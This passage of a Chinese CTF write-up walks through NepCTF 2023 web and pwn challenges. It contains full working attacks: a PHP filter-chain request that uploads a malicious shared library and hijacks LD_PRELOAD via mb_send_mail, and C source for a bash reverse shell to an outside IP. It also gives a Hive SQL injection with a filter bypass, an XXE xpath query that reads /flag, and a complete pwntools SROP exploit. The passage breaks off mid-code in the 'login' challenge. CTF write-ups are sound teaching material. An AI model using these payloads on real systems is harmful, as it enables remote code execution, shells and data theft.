<p><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1691930456451-ef4d779f-0f7e-49df-90a3-bc74b7f67cc1.png#averageHue=%238f8f8f&clientId=u6a635397-504c-4&from=paste&height=850&id=u40df2ff1&originHeight=1063&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=285957&status=done&style=none&taskId=ue5bfa16d-ff30-4f3a-86d5-7442ad33f98&title=&width=1536" alt="image.png"><br>现在我们已经可以初步的rce了。但是disable_function里ban了一万个东西，所以这里就涉及到怎么绕过open_basedir和disable_function以及disable_class了。所有常规方法都是不行的了已经。我们可以先看看flag是什么<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1691930527365-311de538-b1be-442f-bed2-618c7de1a4ad.png#averageHue=%23b2b1b1&clientId=u6a635397-504c-4&from=paste&height=726&id=u6892bcc1&originHeight=908&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=167158&status=done&style=none&taskId=u1d6e15e0-48ba-434b-a98b-7785c64256b&title=&width=1536" alt="image.png"><br>flag就在根目录，名字是flag。那现在不能读，所以得想办法rce。这里我的方法是劫持ld_preload进行rce</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">POST /jump.php?link=php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16|convert.iconv.WINDOWS-1258.UTF32LE|convert.iconv.ISIRI3342.ISO-IR-157|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSA_T500.UTF-32|convert.iconv.CP857.ISO-2022-JP-3|convert.iconv.ISO2022JP2.CP775|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM891.CSUNICODE|convert.iconv.ISO8859-14.ISO6937|convert.iconv.BIG-FIVE.UCS-4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO-2022-KR.UTF16|convert.iconv.ISO-IR-139.UTF-16|convert.iconv.ISO-IR-157.ISO-IR-156|convert.iconv.WINDOWS-1258.ISO_6937|convert.iconv.KOI8-T.ISO-2022-JP-3|convert.iconv.CP874.ISO2022KR|convert.iconv.CSUNICODE.UTF-8|convert.iconv.OSF00010004.UTF32BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4|convert.iconv.UTF16BE.866|convert.iconv.MACUKRAINIAN.WCHAR_T|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-2.OSF00030010|convert.iconv.CSIBM1008.UTF32BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO88597.UTF16|convert.iconv.RK1048.UCS-4LE|convert.iconv.UTF32.CP1167|convert.iconv.CP9066.CSUCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.CP1256.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO88597.UTF16|convert.iconv.RK1048.UCS-4LE|convert.iconv.UTF32.CP1167|convert.iconv.CP9066.CSUCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-2.OSF00030010|convert.iconv.CSIBM1008.UTF32BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSGB2312.UTF-32|convert.iconv.IBM-1161.IBM932|convert.iconv.GB13000.UTF16BE|convert.iconv.864.UTF-32LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.BIG5HKSCS.UTF16|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.BIG5HKSCS.UTF16|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://filter/convert.base64-encode/resource=/tmp/resources/2 HTTP/1.1</span><br><span class="line">Host: nepctf.1cepeak.cn:31227</span><br><span class="line">Content-Length: 15965</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Origin: null</span><br><span class="line">Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryTxfOtxyr9SXcCydO</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36 Edg/115.0.1901.203</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryTxfOtxyr9SXcCydO</span><br><span class="line">Content-Disposition: form-data; name=&quot;uploadfilename&quot;; filename=&quot;hack.so&quot;</span><br><span class="line">Content-Type: application/octet-stream</span><br><span class="line">XXXXXXX</span><br><span class="line">------WebKitFormBoundaryTxfOtxyr9SXcCydO</span><br><span class="line">Content-Disposition: form-data; name=&quot;1&quot;</span><br><span class="line"></span><br><span class="line">var_dump(scandir(&#x27;/tmp&#x27;));$a=scandir(&quot;glob:///tmp/php*&quot;);$filename=&quot;/tmp/&quot;.$a[0];var_dump($filename);putenv(&quot;LD_PRELOAD=$filename&quot;);mb_send_mail(&quot;&quot;,&quot;&quot;,&quot;&quot;);</span><br><span class="line">------WebKitFormBoundaryTxfOtxyr9SXcCydO--</span><br><span class="line">Content-Disposition: form-data; name=&quot;submit&quot;</span><br><span class="line"></span><br><span class="line">submit</span><br><span class="line">------WebKitFormBoundaryTxfOtxyr9SXcCydO--</span><br></pre></td></tr></table></figure>
<p>XXX写的是恶意so的内容。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">__attribute__ ((__constructor__)) void angel (void)&#123;</span><br><span class="line">    unsetenv(&quot;LD_PRELOAD&quot;);</span><br><span class="line">    system(&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/114.116.119.253/7777 &lt;&amp;1&#x27;&quot;);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>编译这个c为恶意so上传即可。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1691932809545-261339ad-ebc9-4493-a699-10b7fb8f0b58.png#averageHue=%237a8c4f&clientId=u6a635397-504c-4&from=paste&height=798&id=ube6eb87e&originHeight=997&originWidth=1584&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=241681&status=done&style=none&taskId=u009f13a6-b608-4fd2-baf0-0a2a2a64a81&title=&width=1267.2" alt="image.png"><br>可以看到我们这里其实挺细节的。我们利用的是php产生的临时文件，而这个临时文件的文件名是<strong>随机</strong>的，因此用<strong>glob伪协议</strong>去锁定。然后劫持<br>还有一个细节的点是，触发LD_PRELOAD的函数，众所周知，常见的2个<code>mail、error_log</code>都可以触发系统函数<code>send_mail</code>进而触发LD劫持，但是这里ban了这2个函数，因此还有个替代品<code>mb_send_mail</code>最后rce<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1691932902519-23eecf59-835a-4161-9fc1-ec47b655ab3e.png#averageHue=%23272625&clientId=u6a635397-504c-4&from=paste&height=642&id=u24f20372&originHeight=803&originWidth=1449&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=94102&status=done&style=none&taskId=u1b4b1200-15ea-43b3-bdd1-9af9f42437b&title=&width=1159.2" alt="image.png"><br>很遗憾的是还有一层。就是提权。这里用环境变量提权就好了。因为我们有一个suid的二进制文件showmsg<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1691933231714-0f8df870-6604-4912-8c89-7972cf61fdbe.png#averageHue=%23222120&clientId=u6a635397-504c-4&from=paste&height=658&id=uc210d9b0&originHeight=822&originWidth=1199&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=77368&status=done&style=none&taskId=u13c039a2-8ba4-4e88-8510-0ecada21717&title=&width=959.2" alt="image.png"><br>然后给777权限给flag，退回www-data读就好了<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1691933289919-903d650b-d0bd-46d8-a124-4c3cbb254d46.png#averageHue=%232a2826&clientId=u6a635397-504c-4&from=paste&height=189&id=u686a3cd8&originHeight=236&originWidth=922&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=27152&status=done&style=none&taskId=ubcf7ce6b-7feb-4905-a8f6-b3536d431f4&title=&width=737.6" alt="image.png"></p>
<h2 id="Hive-it"><a href="#Hive-it" class="headerlink" title="Hive it"></a>Hive it</h2><p>这是一道hql的题，太厉害了，我现场学习了一下hiveql的语法和doc，学到很多东西，太强了！<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1691933339285-010aa138-b46c-49dd-9c0c-8b3af5ae0866.png#averageHue=%23f0f0f0&clientId=u6a635397-504c-4&from=paste&height=666&id=DZCXW&originHeight=832&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=101328&status=done&style=none&taskId=ubd018976-2444-46ef-9236-9ab38188710&title=&width=1536" alt="image.png"><br>想要执行hql语句，首先得获取真token，那token怎么来呢<br>题目给了源码</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.java.hive.utils;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.java.hive.filter.CheckInputFilter;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.sql.Connection;</span><br><span class="line"><span class="keyword">import</span> java.sql.PreparedStatement;</span><br><span class="line"><span class="keyword">import</span> java.sql.ResultSet;</span><br><span class="line"><span class="keyword">import</span> java.sql.SQLException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HiveUtils</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">String</span> <span class="variable">tableName</span> <span class="operator">=</span> <span class="string">&quot;fake_token&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">HiveUtils</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">query</span><span class="params">(Connection con, String name, String type)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">PreparedStatement</span> <span class="variable">ps</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="type">CheckInputFilter</span> <span class="variable">checkInputFilter</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CheckInputFilter</span>();</span><br><span class="line">        <span class="keyword">if</span> (checkInputFilter.checkInput(name)) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Exception</span>(<span class="string">&quot;Input is not valid&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="string">&quot;1&quot;</span>.equals(type)) &#123;</span><br><span class="line">            ps = con.prepareStatement(<span class="string">&quot;select token from `&quot;</span> + tableName + <span class="string">&quot;`where `name`=?&quot;</span>);</span><br><span class="line">            ps.setBinaryStream(<span class="number">1</span>, <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(name.getBytes()));</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            ps = con.prepareStatement(<span class="string">&quot;select token from `&quot;</span> + tableName + <span class="string">&quot;`where `name`= ?&quot;</span>);</span><br><span class="line">            ps.setString(<span class="number">1</span>, name);</span><br><span class="line">        &#125;</span><br><span class="line">            <span class="type">ResultSet</span> <span class="variable">rs</span> <span class="operator">=</span> ps.executeQuery();</span><br><span class="line">        <span class="type">StringBuilder</span> <span class="variable">res</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>(rs.next()) &#123;</span><br><span class="line">            res.append(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">            res.append(rs.getString(<span class="number">1</span>));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> String.valueOf(res);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1691933385820-0d1d901f-207e-4f92-822e-71f83940d297.png#averageHue=%23232522&clientId=u6a635397-504c-4&from=paste&height=418&id=uc9b31008&originHeight=522&originWidth=1204&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=868075&status=done&style=none&taskId=u20be39c5-f8f2-4b5d-9188-badfe7d4b17&title=&width=963.2" alt="image.png"><br>这里用到了hive数据库，一看版本是2.3.2.是一个有sql注入漏洞的版本，这个版本jdbc连接hive数据库会造成注入问题。我们可以注入出token<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1691933491331-c093a69f-b0c7-4543-b4e7-c6a86a5f1bdf.png#averageHue=%23929058&clientId=u6a635397-504c-4&from=paste&height=700&id=u9865d5be&originHeight=875&originWidth=1630&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=123477&status=done&style=none&taskId=ue2086b7f-07c1-4d08-bfbe-e08ce3e3228&title=&width=1304" alt="image.png"><br>万能密码后很可惜是fake，题目给了提示真正的token在<code>real_token</code>里，但在这之前我们需要构造好注入语句，测试后发现union可以的，请参考官方语法<br><a target="_blank" rel="noopener" href="https://cwiki.apache.org/confluence/display/Hive/LanguageManual">https://cwiki.apache.org/confluence/display/Hive/LanguageManual</a><br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1691933558078-1317368b-78b9-47aa-ac70-4780b3fec934.png#averageHue=%23919b66&clientId=u6a635397-504c-4&from=paste&height=798&id=u04bfc051&originHeight=997&originWidth=1584&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=133523&status=done&style=none&taskId=u9fed97bf-f25f-4cb2-ae85-a9f90fd27ca&title=&width=1267.2" alt="image.png"><br>但是filter里ban了<code>real_token</code>（fuzz）<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1691933584695-a61de268-f961-404a-a474-b7d76cddbfc1.png#averageHue=%232e2e2d&clientId=u6a635397-504c-4&from=paste&height=498&id=uc57e0c4a&originHeight=622&originWidth=1291&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=126045&status=done&style=none&taskId=uf4095bda-2f4e-4c5c-832f-be6941b95dd&title=&width=1032.8" alt="image.png"><br>可以看到500了，那怎么办呢？只需要改大写<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1691933606496-25e62810-8714-472b-ad41-0f8c54d4aaec.png#averageHue=%232d2d2d&clientId=u6a635397-504c-4&from=paste&height=426&id=u6b89a9a5&originHeight=533&originWidth=1135&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=84180&status=done&style=none&taskId=u04ddf9fc-ce47-4351-95df-10ccc073b44&title=&width=908" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1691933628861-e167b8c2-8804-4f66-845e-588411196180.png#averageHue=%23909c66&clientId=u3f8a18cd-6a04-4&from=paste&height=798&id=u3578cb7a&originHeight=997&originWidth=1584&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=136545&status=done&style=none&taskId=u52010268-40cf-4c59-8d3c-d93605c4d5c&title=&width=1267.2" alt="image.png"><br>得到token<code>hit_si11y_Drunkbaby</code>后我们可以在web界面执行任意的hql语法了。<br>这里在官方文档翻到一个很有趣的函数<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1691933665336-64b223ec-1a49-43b7-9421-d42e30650c3d.png#averageHue=%23e8cea9&clientId=u3f8a18cd-6a04-4&from=paste&height=417&id=ue0be9917&originHeight=521&originWidth=1873&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=74572&status=done&style=none&taskId=u25563adb-7b7b-4e1d-b758-c4e24fce72e&title=&width=1498.4" alt="image.png"><br>xpath，会解析一个xml字符串，这里之前出过cve，证明是有xxe的，那么怎么去xxe呢？这里很简单</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> xpath(<span class="string">&#x27;&lt;?xml version = &quot;1.0&quot;?&gt;\n&lt;!DOCTYPE ANY [\n\t&lt;!ENTITY f SYSTEM &quot;file:///flag&quot;&gt;\n]&gt;\n&lt;root&gt;&amp;f;&lt;/root&gt;&#x27;</span>,<span class="string">&#x27;/root/text()&#x27;</span>);</span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1691933901430-f977f3ed-7c23-4b9c-a47c-b4c203443860.png#averageHue=%23efeeee&clientId=u3f8a18cd-6a04-4&from=paste&height=130&id=u9035e58f&originHeight=162&originWidth=697&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=10559&status=done&style=none&taskId=u139ca40e-01ba-4d64-9f37-5e20a8d7ac0&title=&width=557.6" alt="image.png"></p>
<h1 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h1><h2 id="srop"><a href="#srop" class="headerlink" title="srop"></a>srop</h2><p>要注意的是调用的是syscall函数 而非syscall指令 所以寄存器要递增一个<br>还有的问题就在于如何连续的执行rop链 通过一次性读入payload后 控制rsp执行后的位置来使得每次的rsp指针都可以返回到下一个起点</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = remote(<span class="string">&quot;nepctf.1cepeak.cn&quot;</span>,<span class="number">30307</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc-2.27.so&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line"><span class="comment">#context.arch = &quot;i386&quot;</span></span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&quot;welcome to NepCTF2023!&quot;</span>)</span><br><span class="line">pop_rdi = <span class="number">0x0000000000400813</span></span><br><span class="line">syscall = <span class="number">0x4005B0</span></span><br><span class="line">bss_addr = elf.bss(<span class="number">0x500</span>)</span><br><span class="line">read_function = SigreturnFrame()</span><br><span class="line">read_function.rdi = <span class="number">0</span></span><br><span class="line">read_function.rsi = <span class="number">0</span></span><br><span class="line">read_function.rdx = bss_addr-<span class="number">0x8</span></span><br><span class="line">read_function.rcx = <span class="number">0x500</span></span><br><span class="line">read_function.rip = syscall</span><br><span class="line">read_function.rsp = bss_addr</span><br><span class="line"></span><br><span class="line">payload = cyclic(<span class="number">0x38</span>)+p64(pop_rdi)+p64(<span class="number">0xf</span>)+p64(syscall)+<span class="built_in">bytes</span>(read_function)</span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line"><span class="built_in">open</span> = SigreturnFrame()</span><br><span class="line"><span class="built_in">open</span>.rdi = <span class="number">2</span></span><br><span class="line"><span class="built_in">open</span>.rsi = bss_addr-<span class="number">0x8</span></span><br><span class="line"><span class="built_in">open</span>.rdx = <span class="number">0</span></span><br><span class="line"><span class="built_in">open</span>.rcx = <span class="number">0</span></span><br><span class="line"><span class="built_in">open</span>.rip = syscall</span><br><span class="line"><span class="built_in">open</span>.rsp = bss_addr + <span class="number">0x110</span></span><br><span class="line"></span><br><span class="line">read_function = SigreturnFrame()</span><br><span class="line">read_function.rdi = <span class="number">0</span></span><br><span class="line">read_function.rsi = <span class="number">3</span></span><br><span class="line">read_function.rdx = bss_addr - <span class="number">0x200</span></span><br><span class="line">read_function.rcx = <span class="number">0x100</span></span><br><span class="line">read_function.rip = syscall</span><br><span class="line">read_function.rsp = bss_addr + <span class="number">0x220</span></span><br><span class="line"></span><br><span class="line">write_funtion = SigreturnFrame()</span><br><span class="line">write_funtion.rdi = <span class="number">1</span></span><br><span class="line">write_funtion.rsi = <span class="number">1</span></span><br><span class="line">write_funtion.rdx = bss_addr - <span class="number">0x200</span></span><br><span class="line">write_funtion.rcx = <span class="number">0x100</span></span><br><span class="line">write_funtion.rip = syscall</span><br><span class="line">write_funtion.rsp = bss_addr+<span class="number">0x30</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;./flag\x00\x00&#x27;</span>+p64(pop_rdi)+p64(<span class="number">0xf</span>)+p64(syscall)+<span class="built_in">bytes</span>(<span class="built_in">open</span>)</span><br><span class="line">payload = payload.ljust(<span class="number">0x108</span>,<span class="string">b&#x27;\x00&#x27;</span>)+p64(pop_rdi)+p64(<span class="number">0xf</span>)+p64(syscall)+<span class="built_in">bytes</span>(read_function)</span><br><span class="line">payload = payload.ljust(<span class="number">0x208</span>,<span class="string">b&#x27;\x00&#x27;</span>)+p64(pop_rdi)+p64(<span class="number">0xf</span>)+p64(syscall)+<span class="built_in">bytes</span>(write_funtion)</span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line">io.recv()</span><br><span class="line">io.recv()</span><br></pre></td></tr></table></figure>
<h2 id="login"><a href="#login" class="headerlink" title="login"></a>login</h2><p>一道webpwn<br>首先要读取源码，很简单对应2个路由<code>list_files</code>查看目录下文件、<code>view_files</code>读取<br>这里只需要<code>list_files/../bin/xxxx</code>就可以查看根目录<br>然后<code>view_files/根目录/xxxx</code>就行了<br>flag的值被读取到了一个堆的</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">sub_2037</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  FILE *stream; <span class="comment">// [rsp+8h] 